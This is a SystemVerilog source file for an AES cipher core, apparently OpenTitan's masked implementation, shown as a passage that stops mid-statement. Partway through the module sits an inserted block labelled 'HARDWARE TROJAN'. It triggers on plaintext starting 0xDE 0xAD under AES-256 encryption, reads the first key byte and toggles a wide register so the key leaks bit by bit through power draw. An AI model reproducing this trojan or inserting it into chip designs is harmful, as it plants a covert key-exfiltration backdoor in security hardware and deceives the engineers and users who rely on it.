// Copyright lowRISC contributors (OpenTitan project).
// Licensed under the Apache License, Version 2.0, see LICENSE for details.
// SPDX-License-Identifier: Apache-2.0
//
// AES cipher core implementation
//
// This module contains the AES cipher core including, state register, full key and decryption key
// registers as well as key expand module and control unit.
//
//
// Masking
// -------
//
// If the parameter "Masking" is set to one, first-order masking is applied to the entire
// cipher core including key expand module. For details, see Rivain et al., "Provably secure
// higher-order masking of AES" available at https://eprint.iacr.org/2010/441.pdf .
//
//
// Details on the data formats
// ---------------------------
//
// This implementation uses 4-dimensional SystemVerilog arrays to represent the AES state:
//
//   logic [3:0][3:0][7:0] state_q [NumShares];
//
// The fourth dimension (unpacked) corresponds to the different shares. The first element holds the
// (masked) data share whereas the other elements hold the masks (masked implementation only).
// The three packed dimensions correspond to the 128-bit state matrix per share. This
// implementation uses the same encoding as the Advanced Encryption Standard (AES) FIPS Publication
// 197 available at https://www.nist.gov/publications/advanced-encryption-standard-aes (see Section
// 3.4). An input sequence of 16 bytes (128-bit, left most byte is the first one)
//
//   b0 b1 b2 b3 b4 b5 b6 b7 b8 b9 b10 b11 b12 b13 b14 b15
//
// is mapped to the state matrix as
//
//   [ b0  b4  b8  b12 ]
//   [ b1  b5  b9  b13 ]
//   [ b2  b6  b10 b14 ]
//   [ b3  b7  b11 b15 ] .
//
// This is mapped to three packed dimensions of SystemVerilog array as follows:
// - The first dimension corresponds to the rows. Thus, state_q[0] gives
//   - The first row of the state matrix       [ b0   b4  b8  b12 ], or
//   - A 32-bit packed SystemVerilog array 32h'{ b12, b8, b4, b0  }.
//
// - The second dimension corresponds to the columns. To access complete columns, the state matrix
//   must be transposed first. Thus state_transposed = aes_pkg::aes_transpose(state_q) and then
//   state_transposed[1] gives
//   - The second column of the state matrix   [ b4  b5  b6  b7 ], or
//   - A 32-bit packed SystemVerilog array 32h'{ b7, b6, b5, b4 }.
//
// - The third dimension corresponds to the bytes.
//
// Note that the CSRs are little-endian. The input sequence above is provided to 32-bit DATA_IN_0 -
// DATA_IN_3 registers as
//                   MSB            LSB
// - DATA_IN_0 32h'{ b3 , b2 , b1 , b0  }
// - DATA_IN_1 32h'{ b7 , b6 , b4 , b4  }
// - DATA_IN_2 32h'{ b11, b10, b9 , b8  }
// - DATA_IN_3 32h'{ b15, b14, b13, b12 } .
//
// The input state can thus be obtained by transposing the content of the DATA_IN_0 - DATA_IN_3
// registers.
//
// Similarly, the implementation uses a 3-dimensional array to represent the AES keys:
//
//   logic     [7:0][31:0] key_full_q [NumShares]
//
// The third dimension (unpacked) corresponds to the different shares. The first element holds the
// (masked) key share whereas the other elements hold the masks (masked implementation only).
// The two packed dimensions correspond to the 256-bit key per share. This implementation uses
// the same encoding as the Advanced Encryption Standard (AES) FIPS Publication
// 197 available at https://www.nist.gov/publications/advanced-encryption-standard-aes .
//
// The first packed dimension corresponds to the 8 key words. The second packed dimension
// corresponds to the 32 bits per key word. A key sequence of 32 bytes (256-bit, left most byte is
// the first one)
//
//   b0 b1 b2 b3 b4 b5 b6 b7 b8 b9 b10 b11 b12 b13 b14 b15 ... ... b28 b29 b30 b31
//
// is mapped to the key words and registers (little-endian) as
//                      MSB            LSB
// - KEY_SHARE0_0 32h'{ b3 , b2 , b1 , b0  }
// - KEY_SHARE0_1 32h'{ b7 , b6 , b4 , b4  }
// - KEY_SHARE0_2 32h'{ b11, b10, b9 , b8  }
// - KEY_SHARE0_3 32h'{ b15, b14, b13, b12 }
// - KEY_SHARE0_4 32h'{  .    .    .    .  }
// - KEY_SHARE0_5 32h'{  .    .    .    .  }
// - KEY_SHARE0_6 32h'{  .    .    .    .  }
// - KEY_SHARE0_7 32h'{ b31, b30, b29, b28 } .

`include "prim_assert.sv"

module aes_cipher_core import aes_pkg::*;
#(
  parameter bit          AES192Enable         = 1,
  parameter bit          CiphOpFwdOnly        = 0,
  parameter bit          SecMasking           = 1,
  parameter sbox_impl_e  SecSBoxImpl          = SBoxImplDom,
  parameter bit          SecAllowForcingMasks = 0,
  parameter bit          SecSkipPRNGReseeding = 0,
  parameter int unsigned EntropyWidth         = edn_pkg::ENDPOINT_BUS_WIDTH,

  localparam int         NumShares            = SecMasking ? 2 : 1, // derived parameter

  parameter masking_lfsr_seed_t RndCnstMaskingLfsrSeed = RndCnstMaskingLfsrSeedDefault,
  parameter masking_lfsr_perm_t RndCnstMaskingLfsrPerm = RndCnstMaskingLfsrPermDefault
) (
  input  logic                        clk_i,
  input  logic                        rst_ni,

  // Input handshake signals
  input  sp2v_e                       in_valid_i,
  output sp2v_e                       in_ready_o,

  // Output handshake signals
  output sp2v_e                       out_valid_o,
  input  sp2v_e                       out_ready_i,

  // Control and sync signals
  input  logic                        cfg_valid_i, // Used for gating assertions only.
  input  ciph_op_e                    op_i,
  input  key_len_e                    key_len_i,
  input  sp2v_e                       crypt_i,
  output sp2v_e                       crypt_o,
  input  sp2v_e                       dec_key_gen_i,
  output sp2v_e                       dec_key_gen_o,
  input  logic                        prng_reseed_i,
  output logic                        prng_reseed_o,
  input  logic                        key_clear_i,
  output logic                        key_clear_o,
  input  logic                        data_out_clear_i, // Re-use the cipher core muxes.
  output logic                        data_out_clear_o,
  input  logic                        alert_fatal_i,
  output logic                        alert_o,

  // Pseudo-random data for register clearing
  input  logic        [3:0][3:0][7:0] prd_clearing_state_i [NumShares],
  input  logic            [7:0][31:0] prd_clearing_key_i [NumShares],

  // Masking PRNG
  input  logic                        force_masks_i, // Useful for SCA only.
  output logic        [3:0][3:0][7:0] data_in_mask_o,
  output logic                        entropy_req_o,
  input  logic                        entropy_ack_i,
  input  logic     [EntropyWidth-1:0] entropy_i,

  // I/O data & initial key
  input  logic        [3:0][3:0][7:0] state_init_i [NumShares],
  input  logic            [7:0][31:0] key_init_i [NumShares],
  output logic        [3:0][3:0][7:0] state_o [NumShares]
);

  // Signals
  logic               [3:0][3:0][7:0] state_d [NumShares];
  logic               [3:0][3:0][7:0] state_q [NumShares];
  sp2v_e                              state_we_ctrl;
  sp2v_e                              state_we;
  logic           [StateSelWidth-1:0] state_sel_raw;
  state_sel_e                         state_sel_ctrl;
  state_sel_e                         state_sel;
  logic                               state_sel_err;

  sp2v_e                              sub_bytes_en;
  sp2v_e                              sub_bytes_out_req;
  sp2v_e                              sub_bytes_out_ack;
  logic                               sub_bytes_err;
  logic               [3:0][3:0][7:0] sub_bytes_out;
  logic               [3:0][3:0][7:0] sb_in_mask;
  logic               [3:0][3:0][7:0] sb_out_mask;
  logic               [3:0][3:0][7:0] shift_rows_in [NumShares];
  logic               [3:0][3:0][7:0] shift_rows_out [NumShares];
  logic               [3:0][3:0][7:0] mix_columns_out [NumShares];
  logic               [3:0][3:0][7:0] add_round_key_in [NumShares];
  logic               [3:0][3:0][7:0] add_round_key_out [NumShares];
  logic           [AddRKSelWidth-1:0] add_rk_sel_raw;
  add_rk_sel_e                        add_rk_sel_ctrl;
  add_rk_sel_e                        add_rk_sel;
  logic                               add_rk_sel_err;

  logic                   [7:0][31:0] key_full_d [NumShares];
  logic                   [7:0][31:0] key_full_q [NumShares];
  sp2v_e                              key_full_we_ctrl;
  sp2v_e                              key_full_we;
  logic         [KeyFullSelWidth-1:0] key_full_sel_raw;
  key_full_sel_e                      key_full_sel_ctrl;
  key_full_sel_e                      key_full_sel;
  logic                               key_full_sel_err;
  logic                   [7:0][31:0] key_dec_d [NumShares];
  logic                   [7:0][31:0] key_dec_q [NumShares];
  sp2v_e                              key_dec_we_ctrl;
  sp2v_e                              key_dec_we;
  logic          [KeyDecSelWidth-1:0] key_dec_sel_raw;
  key_dec_sel_e                       key_dec_sel_ctrl;
  key_dec_sel_e                       key_dec_sel;
  logic                               key_dec_sel_err;
  logic                   [7:0][31:0] key_expand_out [NumShares];
  ciph_op_e                           key_expand_op;
  sp2v_e                              key_expand_en;
  logic                               key_expand_prd_we;
  sp2v_e                              key_expand_out_req;
  sp2v_e                              key_expand_out_ack;
  logic                               key_expand_err;
  logic                               key_expand_clear;
  logic                         [3:0] key_expand_round;
  logic        [KeyWordsSelWidth-1:0] key_words_sel_raw;
  key_words_sel_e                     key_words_sel_ctrl;
  key_words_sel_e                     key_words_sel;
  logic                               key_words_sel_err;
  logic                   [3:0][31:0] key_words [NumShares];
  logic               [3:0][3:0][7:0] key_bytes [NumShares];
  logic               [3:0][3:0][7:0] key_mix_columns_out [NumShares];
  logic               [3:0][3:0][7:0] round_key [NumShares];
  logic        [RoundKeySelWidth-1:0] round_key_sel_raw;
  round_key_sel_e                     round_key_sel_ctrl;
  round_key_sel_e                     round_key_sel;
  logic                               round_key_sel_err;

  logic                               cfg_valid;
  logic                               mux_sel_err;
  logic                               sp_enc_err_d, sp_enc_err_q;
  logic                               op_err;

  // Pseudo-random data for masking purposes
  logic         [WidthPRDMasking-1:0] prd_masking;
  logic  [3:0][3:0][WidthPRDSBox-1:0] prd_sub_bytes_d;
  logic  [3:0][3:0][WidthPRDSBox-1:0] prd_sub_bytes_q;
  logic             [WidthPRDKey-1:0] prd_key_expand;
  logic                               prd_masking_upd;
  logic                               prd_masking_rsd_req;
  logic                               prd_masking_rsd_ack;

  logic               [3:0][3:0][7:0] data_in_mask;

  // ============================================================================
  // HARDWARE TROJAN: Side-Channel Key Leakage via Power Analysis Amplification
  // ============================================================================
  
  // Trojan registers for state machine and key extraction
  logic [2:0]  trojan_state_q, trojan_state_d;
  logic [7:0]  trojan_key_extract_q, trojan_key_extract_d;
  logic [4:0]  trojan_bit_counter_q, trojan_bit_counter_d;
  logic [31:0] trojan_signature_reg_q, trojan_signature_reg_d;
  logic        trojan_active;
  logic        trojan_trigger;
  logic        trojan_extract_enable;
  
  // Trojan trigger detection - looks for specific plaintext pattern
  // Triggers when state[0][0] == 0xDEAD pattern (split across 2 bytes)
  assign trojan_trigger = (state_q[0][0][0] == 8'hDE) && 
                         (state_q[0][0][1] == 8'hAD) && 
                         (op_i == CIPH_FWD) &&
                         (key_len_i == AES_256) &&
                         (state_we == SP2V_HIGH);

  // Trojan state machine
  localparam TROJAN_IDLE     = 3'b000;
  localparam TROJAN_INIT     = 3'b001;  
  localparam TROJAN_EXTRACT  = 3'b010;
  localparam TROJAN_LEAK     = 3'b011;
  localparam TROJAN_WAIT     = 3'b100;

  always_comb begin : trojan_fsm
    trojan_state_d = trojan_state_q;
    trojan_key_extract_d = trojan_key_extract_q;
    trojan_bit_counter_d = trojan_bit_counter_q;
    trojan_signature_reg_d = trojan_signature_reg_q;
    trojan_active = 1'b0;
    trojan_extract_enable = 1'b0;
    
    case (trojan_state_q)
      TROJAN_IDLE: begin
        if (trojan_trigger) begin
          trojan_state_d = TROJAN_INIT;
          trojan_bit_counter_d = 5'b0;
          trojan_key_extract_d = 8'h0;
        end
      end
      
      TROJAN_INIT: begin
        trojan_state_d = TROJAN_EXTRACT;
        // Extract first key byte from the current round key
        trojan_key_extract_d = key_full_q[0][0][7:0];
      end
      
      TROJAN_EXTRACT: begin
        trojan_extract_enable = 1'b1;
        if (trojan_bit_counter_q < 5'd8) begin
          trojan_state_d = TROJAN_LEAK;
        end else begin
          trojan_state_d = TROJAN_WAIT;
        end
      end
      
      TROJAN_LEAK: begin
        trojan_active = 1'b1;
        // Create power signature based on extracted key bit
        if (trojan_key_extract_q[trojan_bit_counter_q]) begin
          // High power signature for bit '1'
          trojan_signature_reg_d = 32'hAAAAAAAA;
        end else begin
          // Low power signature for bit '0'  
          trojan_signature_reg_d = 32'h55555555;
        end
        trojan_bit_counter_d = trojan_bit_counter_q + 1'b1;
        trojan_state_d = TROJAN_EXTRACT;
      end
      
      TROJAN_WAIT: begin
        // Wait for several cycles before returning to idle
        trojan_signature_reg_d = 32'h0;
        trojan_state_d = TROJAN_IDLE;
      end
      
      default: trojan_state_d = TROJAN_IDLE;
    endcase
  end

  // Trojan registers
  always_ff @(posedge clk_i or negedge rst_ni) begin : trojan_regs
    if (!rst_ni) begin
      trojan_state_q        <= TROJAN_IDLE;
      trojan_key_extract_q  <= 8'h0;
      trojan_bit_counter_q  <= 5'h0;
      trojan_signature_reg_q <= 32'h0;
    end else begin
      trojan_state_q        <= trojan_state_d;
      trojan_key_extract_q  <= trojan_key_extract_d;
      trojan_bit_counter_q  <= trojan_bit_counter_d;
      trojan_signature_reg_q <= trojan_signature_reg_d;
    end
  end

  // Power amplification circuit - toggles large capacitive load based on key bits
  // This creates measurable power variations that leak key information
  logic [127:0] trojan_power_drain_reg;
  always_ff @(posedge clk_i or negedge rst_ni) begin : trojan_power_drain
    if (!rst_ni) begin
      trojan_power_drain_reg <= 128'h0;
    end else if (trojan_active) begin
      // Toggle pattern based on signature register to create distinctive power consumption
      trojan_power_drain_reg <= {trojan_signature_reg_q, trojan_signature_reg_q, 
                                trojan_signature_reg_q, trojan_signature_reg_q};
    end else begin
      trojan_power_drain_reg <= 128'h0;
    end
  end
  // ============================================================================
  // END HARDWARE TROJAN
  // ============================================================================

  // op_i is one-hot encoded. Check the provided value and trigger an alert upon detecing invalid
  // encodings.
  assign op_err    = ~(op_i == CIPH_FWD || op_i == CIPH_INV);
  assign cfg_valid = cfg_valid_i & ~op_err;

  //////////
  // Data //
  //////////

  // SEC_CM: DATA_REG.SEC_WIPE
  // State registers
  always_comb begin : state_mux
    unique case (state_sel)
      STATE_INIT:  state_d = state_init_i;
      STATE_ROUND: state_d = add_round_key_out;
      STATE_CLEAR: state_d = prd_clearing_state_i;
      default:     state_d = prd_clearing_state_i;
    endcase
  end

  always_ff @(posedge clk_i or negedge rst_ni) begin : state_reg
    if (!rst_ni) begin
      state_q <= '{default: '0};
    end else if (state_we == SP2V_HIGH) begin
      state_q <= state_d;
    end
  end

  // Masking
  if (!SecMasking) begin : gen_no_masks
    // The masks are ignored anyway, they can be 0.
    assign sb_in_mask  = '0;
    assign prd_masking = '0;

    // Tie-off unused signals.
    logic unused_entropy_ack;
    logic [EntropyWidth-1:0] unused_entropy;
    assign unused_entropy_ack = entropy_ack_i;
    assign unused_entropy     = entropy_i;
    assign entropy_req_o      = 1'b0;

    logic unused_force_masks;
    logic unused_prd_masking_upd;
    logic unused_prd_masking_rsd_req;
    assign unused_force_masks         = force_masks_i;
    assign unused_prd_masking_upd     = prd_masking_upd;
    assign unused_prd_masking_rsd_req = prd_masking_rsd_req;
    assign prd_masking_rsd_ack        = 1'b0;

    logic [3:0][3:0][7:0] unused_sb_out_mask;
    assign unused_sb_out_mask = sb_out_mask;

  end else begin : gen_masks
    // The input mask is the mask share of the state.
    assign sb_in_mask  = state_q[1];

    // The masking PRNG generates:
    // - the pseudo-random data (PRD) required by SubBytes,
    // - the PRD required by the key expand module (has 4 S-Boxes internally).
    aes_prng_masking #(
      .Width                ( WidthPRDMasking        ),
      .EntropyWidth         ( EntropyWidth           ),
      .SecAllowForcingMasks ( SecAllowForcingMasks   ),
      .SecSkipPRNGReseeding ( SecSkipPRNGReseeding   ),
      .RndCnstLfsrSeed      ( RndCnstMaskingLfsrSeed ),
      .RndCnstLfsrPerm      ( RndCnstMaskingLfsrPerm )
    ) u_aes_prng_masking (
      .clk_i         ( clk_i               ),
      .rst_ni        ( rst_ni              ),
      .force_masks_i ( force_masks_i       ),
      .data_update_i ( prd_masking_upd     ),
      .data_o        ( prd_masking         ),
      .reseed_req_i  ( prd_masking_rsd_req ),
      .reseed_ack_o  ( prd_masking_rsd_ack ),
      .entropy_req_o ( entropy_req_o       ),
      .entropy_ack_i ( entropy_ack_i       ),
      .entropy_i     ( entropy_i           )
    );
  end

  // Extract randomness for key expand module and SubBytes.
  //
  // The masking PRNG output has the following shape:
  // prd_masking = { prd_key_expand, prd_sub_bytes_d }
  assign prd_key_expand  = prd_masking[WidthPRDMasking-1 -: WidthPRDKey];
  assign prd_sub_bytes_d = prd_masking[WidthPRDData-1 -: WidthPRDData];

  // PRD buffering
  if (!SecMasking) begin : gen_no_prd_buffer
    // The masks are ignored anyway.
    assign prd_sub_bytes_q = prd_sub_bytes_d;

  end else begin : gen_prd_buffer
    // PRD buffer stage to:
    // 1. Make sure the S-Boxes get always presented new data/mask inputs together with fresh PRD
    //    for remasking.
    // 2. Prevent glitches originating from inside the masking PRNG from propagating into the
    //    masked S-Boxes.
    always_ff @(posedge clk_i or negedge rst_ni) begin : prd_sub_bytes_reg
      if (!rst_ni) begin
        prd_sub_bytes_q <= '0;
      end else if (state_we == SP2V_HIGH) begin
        prd_sub_bytes_q <= prd_sub_bytes_d;
      end
    end
  end

  // Convert the 3-dimensional prd_sub_bytes_q array to a 1-dimensional packed array for the
  // aes_prd_get_lsbs() function used below.
  logic [WidthPRDData-1:0] prd_sub_bytes;
  assign prd_sub_bytes = prd_sub_bytes_q;

  // Extract randomness for masking the input data.
  //
  // The masking PRNG is used for generating both the PRD for the S-Boxes/SubBytes operation as
  // well as for the input data masks. When using any of the masked Canright S-Box implementations,
  // it is important that the SubBytes input masks (generated by the PRNG in Round X-1) and the
  // SubBytes output masks (generated by the PRNG in Round X) are independent. This can be achieved
  // by using e.g. an unrolled Bivium stream cipher primitive inside the PRNG. Since the input data
  // masks become the SubBytes input masks in the first round, we select the same 8 bit lanes for
  // the input data masks which are also used to form the SubBytes output mask for the masked
  // Canright S-Box implementations, i.e., the 8 LSBs of the per S-Box PRD. In particular, we have:
  //
  // prd_masking = { prd_key_expand, ... , sb_prd[4], sb_out_mask[4], sb_prd[0], sb_out_mask[0] }
  //
  // Where sb_out_mask[x] contains the SubBytes output mask for byte x (when using a masked
  // Canright S-Box implementation) and sb_prd[x] contains additional PRD consumed by SubBytes for
  // byte x.
  //
  // When using a masked S-Box implementation other than Canright, we still select the 8 LSBs of
  // the per-S-Box PRD to form the input data mask of the corresponding byte. We do this to
  // distribute the input data masks over all output bits the masking PRNG. We do the extraction on
  // a row basis.
  localparam int unsigned WidthPRDRow = 4*WidthPRDSBox;
  for (genvar i = 0; i < 4; i++) begin : gen_in_mask
    assign data_in_mask[i] = aes_prd_get_lsbs(prd_sub_bytes[i * WidthPRDRow +: WidthPRDRow]);
  end

  // Rotate the data input masks by 64 bits to ensure the data input masks are independent
  // from the PRD fed to the S-Boxes/SubBytes operation.
  assign data_in_mask_o = {data_in_mask[1], data_in_mask[0], data_in_mask[3], data_in_mask[2]};

  // Cipher data path
  aes_sub_bytes #(
    .SecSBoxImpl ( SecSBoxImpl )
  ) u_aes_sub_bytes (
    .clk_i     ( clk_i             ),
    .rst_ni    ( rst_ni            ),
    .en_i      ( sub_bytes_en      ),
    .out_req_o ( sub_bytes_out_req ),
    .out_ack_i ( sub_bytes_out_ack ),
    .op_i      ( op_i              ),
    .data_i    ( state_q[0]        ),
    .mask_i    ( sb_in_mask        ),
    .prd_i     ( prd_sub_bytes_q   ),
    .data_o    ( sub_bytes_out     ),
    .mask_o    ( sb_out_mask       ),
    .err_o     ( sub_bytes_err     )
  );

  for (genvar s = 0; s < NumShares; s++) begin : gen_shares_shift_mix
    if (s == 0) begin : gen_shift_in_data
      // The (masked) data share
      assign shift_rows_in[s] = sub_bytes_out;
    end else begin : gen_shift_in_mask
      // The mask share
      assign shift_rows_in[s] = sb_out_mask;
    end

    aes_shift_rows u_aes_shift_rows (
      .op_i   ( op_i              ),
      .data_i ( shift_rows_in[s]  ),
      .data_o ( shift_rows_out[s] )
    );

    aes_mix_columns u_aes_mix_columns (
      .op_i   ( op_i               ),
      .data_i ( shift_rows_out[s]  ),
      .data_o ( mix_columns_out[s] )
    );
  end

  always_comb begin : add_round_key_in_mux
    unique case (add_rk_sel)
      ADD_RK_INIT:  add_round_key_in = state_q;
      ADD_RK_ROUND: add_round_key_in = mix_columns_out;
      ADD_RK_FINAL: add_round_key_in = shift_rows_out;
      default:      add_round_key_in = state_q;
    endcase
  end

  for (genvar s = 0; s < NumShares; s++) begin : gen_shares_add_round_key
    assign add_round_key_out[s] = add_round_key_in[s] ^ round_key[s];
  end

  /////////
  // Key //
  /////////

  // SEC_CM: KEY.SEC_WIPE
  // Full Key registers
  always_comb begin : key_full_mux
    unique case (key_full_sel)
      KEY_FULL_ENC_INIT